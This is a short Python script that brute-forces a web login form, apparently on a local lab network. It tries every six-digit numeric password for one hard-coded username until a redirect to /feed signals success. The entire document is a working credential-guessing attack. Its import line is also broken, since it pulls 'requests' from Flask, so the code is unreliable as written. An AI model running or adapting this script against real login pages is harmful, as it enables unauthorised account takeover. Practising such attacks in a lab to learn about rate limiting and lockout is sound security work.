from flask import Flask, requests, jsonify
import time

URL = "http://192.168.56.1:3000/login"
USERNAME = "fuck"

for number in range(1000000):
    password = f"{number:06d}"

    response = requests.post(
        URL,
        data={
            "username": USERNAME,
            "password": password
        },
        allow_redirects=False
    )

    print(f"Trying: {password}")

    # Successful login redirects to /feed
    if response.status_code == 302:
        location = response.headers.get("Location", "")

        if "/feed" in location:
            print()
            print("================================")
            print("PASSWORD FOUND!")
            print("Username:", USERNAME)
            print("Password:", password)
            print("Attempts:", number + 1)
            print("================================")
            break

    time.sleep(0.05)
else:
    print("Password was not found.")